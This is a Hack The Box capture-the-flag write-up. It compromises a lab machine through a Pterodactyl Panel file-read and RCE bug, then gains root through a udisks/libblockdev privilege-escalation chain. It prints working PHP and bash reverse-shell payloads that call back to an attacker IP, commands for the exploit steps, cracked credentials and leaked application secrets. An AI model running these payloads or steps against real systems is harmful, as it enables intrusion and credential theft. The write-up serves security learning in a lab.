# Hack The Box — Pterodactyl (Writeup)
[Here are the notes I took while solving](./Walkthrough)

> A “medium” box that ended up feeling pretty straightforward once the right breadcrumbs were found. The initial foothold came from a fresh Pterodactyl Panel RCE (CVE-2025-49132), and root was a two-step chain around console privileges + `udisks` / `libblockdev` mounting behavior (CVE-2025-6018 → CVE-2025-6019).

---

## Recon

I started with a classic full TCP scan:

```bash
nmap -p- 10.129.9.21
```

Output:

```text
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
8080/tcp closed http-proxy
```

So: SSH and HTTP open, HTTPS/8080 closed. The “three HTTP ports” thought quickly simplified into “likely multiple virtual hosts on port 80”.

Browsing `http://10.129.9.21` landed me on a Minecraft server homepage. On that page I noticed a subdomain mention: `play.pterodactyl.htb`. I added it to `/etc/hosts` and continued manually poking around.

A `changelog.txt` was accessible and contained:

```text
[Installed] Pterodactyl Panel v1.11.10
```

That immediately triggered the “check upstream changelog / security fixes” reflex, so I went to GitHub and looked at what was fixed right after `v1.11.10`. In `v1.11.11` I found:

> Fixed CVE-2025-49132  
> “Using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code, without being authenticated. …”

At this point I tried the obvious probe:

```text
http://pterodactyl.htb/locales/locale.json
```

…but got a 404. That meant the panel wasn’t on the root vhost and I needed to locate where the panel actually lived.

---

## Finding the Panel vhost

I enumerated vhosts/subdomains and quickly discovered:

```text
panel.pterodactyl.htb  [Status: 200]
```

(Found with a vhost fuzzing approach; in my case the command I ran printed results in a “subfinder-style” output.)

After adding `panel.pterodactyl.htb` to `/etc/hosts`, the endpoint existed:

```text
http://panel.pterodactyl.htb/locales/locale.json
```

---

## Vulnerability Confirmation (CVE-2025-49132)

A public repo that explained the bug clearly was:

https://github.com/Zen-kun04/CVE-2025-49132

Key confirmation logic from that repo matched what I saw:

- If `/locales/locale.json` returns JSON
- and the URL does **not** contain `hash=`
- then it’s vulnerable.

The exploitation detail that mattered: you must pass `locale=` and `namespace=` together; it can read **PHP files** and returns a JSON structure with variables from the selected file.

Example given by the author:

```text
/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
```

I tried the same idea against the target:

```text
http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
```

It worked and instantly paid off with credentials in the JSON response:

- `"username":"pterodactyl"`
- `"password":"PteraPanel"`

That was already huge: it meant I could likely access the database, and it also proved the LFI-ish behavior was real.

---

## From File Read to RCE (PEAR trick + locale/namespace)

The `changelog` hinted at:

> Enabled PHP-PEAR for PHP package management.

So my thinking was: if PEAR is installed and reachable, I might be able to abuse `pearcmd.php` to execute something. I prepared a reverse shell payload in the “classic PHP connect-back style”:

```php
<?php $sock=fsockopen("10.10.14.237",9333);$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>
```

After a lot of trial and error, I found a PEAR-related path that reacted differently (so it was likely the correct target):

```text
locale=../../../../../usr/share/php/PEAR&namespace=pearcmd
```

At that point I took an existing script idea and heavily modified it (stored for me as `scripts/script.py`). After testing multiple times, this command was the one that reliably worked as my final payload:

```bash
python ./exploit.py http://panel.pterodactyl.htb "exec 5<>/dev/tcp/10.10.14.237/9333;cat <&5 | while read line; do \$line 2>&5 >&5; done"
```

That gave me command execution as the web user.

---

## Initial Shell and Environment Data

Once I stabilized the shell, I dumped environment variables (`env`) and got a full picture of the app configuration. The important parts (all as seen):

```text
DB_PORT=3306
LOG_DEPRECATIONS_CHANNEL=null
REDIS_PASSWORD=null
REDIS_PORT=6379
DB_HOST=127.0.0.1
MAIL_PASSWORD=
APP_ENVIRONMENT_ONLY=false
PTERODACTYL_TELEMETRY_ENABLED=false
MAIL_FROM_ADDRESS=no-reply@example.com
APP_LOCALE=en
HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
APP_DEBUG=false
LOG_LEVEL=debug
MAIL_HOST=smtp.example.com
USER=wwwrun
REDIS_HOST=127.0.0.1
APP_ENV=production
PWD=/var/www/pterodactyl
APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
HOME=/var/lib/wwwrun
DB_PASSWORD=PteraPanel
HASHIDS_LENGTH=8
MAIL_ENCRYPTION=tls
APP_URL=http://panel.pterodactyl.htb
MAIL_MAILER=smtp
APP_TIMEZONE=UTC
QUEUE_CONNECTION=redis
CACHE_DRIVER=redis
DB_USERNAME=pterodactyl
SHLVL=1
APP_SERVICE_AUTHOR=pterodactyl@pterodactyl.htb
SESSION_DRIVER=redis
DB_CONNECTION=mysql
APP_THEME=pterodactyl
RECAPTCHA_ENABLED=false
MAIL_PORT=25
MAIL_FROM_NAME=Pterodactyl Panel
LOG_CHANNEL=daily
MAIL_USERNAME=
DB_DATABASE=panel
_=/usr/bin/env
OLDPWD=/var/www/pterodactyl/public
```

I initially assumed there would be a lateral move before `user.txt`, but it turned out the user flag was simply readable from the system’s home directories.

---

## User Flag

Listing `/home` showed:

```text
drwxr-x--- 1 headmonitor  users 140 Dec 31 17:29 headmonitor
drwxr-xr-x 1 phileasfogg3 users 156 Dec 31 17:29 phileasfogg3
```

I went into `phileasfogg3` and grabbed the flag:

```bash
cd /home/phileasfogg3
ls
cat user.txt
```

Flag:

```text
7de7934638e11d7c7d9ad0db3eb8f760
```

---

## Upgrading the Shell (Reverse SSH)

To be more comfortable, I upgraded to a better interactive access using `revssh` (reverse SSH). It made database work and general enumeration much nicer than fighting a raw web-shell-ish environment.

---

## Database → Password Hash → SSH

Because I already had DB credentials (`pterodactyl` / `PteraPanel`) and the DB was local, I connected like this:

```bash
mysql -h 127.0.0.1 -P 3306 -u pterodactyl -p panel
```

Inside the database, I found a password hash that I was able to crack:

```text
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

So credentials:

- `phileasfogg3:!QAZ2wsx`

That password worked for SSH, which gave me a proper user shell:

```bash
ssh phileasfogg3@pterodactyl.htb
```

---

## Looking for PrivEsc Paths

One of the first “interesting service” checks I did was looking at services related to Pterodactyl. I found:

```bash
cat /etc/systemd/system/wings.service
```

Content:

```ini
[Unit]
Description=Pterodactyl Wings Daemon
After=docker.service
Requires=docker.service
PartOf=docker.service

[Service]
User=root
WorkingDirectory=/etc/pterodactyl
LimitNOFILE=4096
PIDFile=/var/run/wings/daemon.pid
ExecStart=/usr/local/bin/wings
Restart=on-failure
StartLimitInterval=180
StartLimitBurst=30
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

`wings` runs as root, but nothing immediately screamed “misconfig / writable unit / path hijack”. I also briefly considered sudo-related escalation, because the system looked like it might match a known sudo vulnerability window:

> Verified risky systems included Ubuntu 24.04.1 (Sudo 1.9.15p5, 1.9.16p2)

The installed sudo version was `1.9.15p5`, which made me hopeful, but after a quick attempt/validation it didn’t work (rabbit hole #1).

---

## Internal Service: CUPS (port 631) and Ligolo-ng detour

During enumeration I noticed an internal web service on port `631` (CUPS). Since it’s local/internal, I tried to access it properly.

CUPS was running as root:

```text
root     17964  0.0  0.5  41032 10496 ?        Ss   14:06   0:00 /usr/sbin/cupsd -l
```

I could have just done a basic SSH tunnel, but I really wanted to use Ligolo-ng again since I enjoyed it last time—so I set up Ligolo.

### Ligolo-ng setup attempt

Upload agent to the target:

```bash
scp /usr/share/ligolo-ng-common-binaries/ligolo-ng_agent_0.8.2_linux_amd64 phileasfogg3@pterodactyl.htb:/tmp/ligolo
```

On the target:

```bash
./ligolo -connect 10.10.14.237:8001 -ignore-cert
```

On my local machine:

```bash
./ligolo.exe -connect 10.10.14.20:8001 -ignore-cert
```

Then in Ligolo:

```text
interface_create --name "evil-cha"
session (select the session)
tunnel_start --tun evil-cha
interface_add_route --name evil-cha --route 240.0.0.1/32
```

The idea: expose target localhost services through `240.0.0.1`.

However, results were odd. Over Ligolo, when I hit CUPS I got:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
    <TITLE>Bad Request - CUPS v2.2.7</TITLE>
    <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Bad Request</H1>
<P></P>
</BODY>
</HTML>
```

But when I tested locally with direct curl patterns it behaved differently. My suspicion was that CUPS might be validating the request as “true localhost” (or expecting specific headers/host formatting) and didn’t like how the traffic arrived through the tunnel. So I decided not to fight it and went back to a simpler approach: SSH tunneling instead.

Also, even though CUPS `v2.2.7` is ancient, I didn’t find a clean, relevant CVE path here (and I remembered HTB already used a 2024-ish CUPS theme in another box). This ended up being rabbit hole #2.

---

## The Real Hint: Mail About `udisksd`

The actual turning point was checking local mail:

```bash
cat /var/mail/phileasfogg3
```

Mail content:

```text
From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
Received: by pterodactyl (Postfix, from userid 0)
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Message-ID: 202511070915.headmonitor@pterodactyl
Date: Fri, 07 Nov 2025 09:15:00 +0100 (CET)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator
```

That’s the kind of hint that basically screams: “stop looking at sudo/cups; look at udisks”.

I looked up what `udisks` was, checked docs/manpages, and noticed references to versions like `udisks 2.9.2` being quite old. When searching for related privilege escalation issues, I found the Canonical/Ubuntu write-up that perfectly matched the idea of a chain:

https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available

The page described two CVEs that connect together:

### CVE-2025-6018

A PAM chain trick where a user logging in via SSH can obtain privileges of a “physical console” `allow_active` user by abusing environment variables order (`pam_env.so` before `pam_systemd.so`), causing `pam_systemd` to grant console privileges.

The important detail: it depends on PAM configuration. Ubuntu defaults are usually safe, unless customized.

### CVE-2025-6019

`udisks` + `libblockdev` calls can mount filesystems without the `nosuid` and `nodev` flags in some operations. If an attacker has mount privileges (which commonly require `allow_active`, i.e., physical console access), they can:

- bring a crafted filesystem image containing a SUID-root binary
- trigger `udisks` / `libblockdev` to mount it in `/tmp` without `nosuid`
- execute the SUID-root shell → root

And the write-up basically spells the intended chain: get `allow_active` first, then abuse `udisks` behavior.

At that point it felt very “designed” for the box.

---

## PrivEsc Step 1: Get `allow_active` (CVE-2025-6018)

The exploit was above my comfort level to implement from scratch, so I used a PoC:

https://github.com/ibrahmsql/CVE-2025-6018

I ran it like this:

```bash
./CVE-2025-6018.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
```

That gave me the required “console-like” authorization (`allow_active`) needed for the next stage.

---

## PrivEsc Step 2: `udisks` / `libblockdev` SUID mount trick (CVE-2025-6019)

Then I used this PoC:

https://github.com/guinea-offensive-security/CVE-2025-6019

This exploit has two parts: create an XFS image locally, then use it on the target to trigger the vulnerable behavior.

### Creating the XFS image locally

On my machine:

```bash
sudo ./exploit.sh
```

I selected **Local** mode (`L`) to create the image:

```text
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): l
...
[+] 300 MB XFS image created: ./xfs.image
[*] Transfer to target with: scp xfs.image <user>@<host>:
```

### Transferring the image to the target

```bash
scp xfs.image phileasfogg3@pterodactyl.htb:/tmp
```

(SSH warning about post-quantum KEX appeared, but transfer succeeded.)

### Running the exploit on target

On the target, I needed `mkfs.xfs` which lived in `/sbin`, so I updated `PATH`:

```bash
export PATH=$PATH:/sbin
```

Then I ran the exploit in **target** mode (`C`):

```bash
./exploit.sh
```

The interaction/output was (as observed):

```text
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
[+] All dependencies are installed.
[*] Checking for vulnerable libblockdev/udisks versions...
[*] Detected udisks version: unknown
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
[!] Continuing with PoC execution...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): c
[*] Starting exploitation on target machine...
[*] Checking allow_active status...
[+] allow_active status confirmed.
[*] Verifying xfs.image integrity...
[*] Stopping gvfs-udisks2-volume-monitor...
[*] Note: gvfs-udisks2-volume-monitor was not running.
[*] Setting up loop device...
[+] Loop device configured: /dev/loop0
[*] Keeping filesystem busy to prevent unmounting...
[+] Background loop started (PID: 14828)
[*] Resizing filesystem to trigger mount...
[+] Mount successful (expected error: target is busy).
[*] Waiting 2 seconds for mount to stabilize...
[*] Checking for SUID bash in /tmp/blockdev*...
[+] SUID bash found: /tmp/blockdev.ZPP5J3/bash
-rwsr-xr-x 1 root root 1380656 Feb 12 17:19 /tmp/blockdev.ZPP5J3/bash
[*] Executing root shell...
bash-5.3# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```

That’s the money line: `euid=0(root)`.

---

## Root Flag

From the root shell:

```bash
cd /root
ls
cat root.txt
```

Output:

```text
f67bbe3f9a65cf886103c629d98dfe4f
```

---

## Conclusion / Personal Notes

Overall this box felt fast and pretty obvious once I was on the right track.

The first exploit (CVE-2025-49132) was genuinely easy to identify thanks to the installed version being explicitly leaked in `changelog.txt`. Executing it took more tinkering than I expected, but nothing crazy; I also ended up making my own PoC (which I almost never do, and honestly I should do more often).

After getting a shell, my only real slowdown was that I didn’t find the mails immediately. I wasted time on rabbit holes like sudo-based ideas (`sudo -l` style thinking) and the CUPS interface. Once I finally found the mail and had the right keywords, the privilege escalation path was basically handed to me: the CVE chain was very “box-authored”.

The final exploit chain (CVE-2025-6018 + CVE-2025-6019) was more complex to truly understand and definitely out of my scripting level, but existing PoCs were available. And because the box is rated “MEDIUM” (not “HARD” or “INSANE”), I really think the intended approach was to use those PoCs rather than reinvent the wheel.
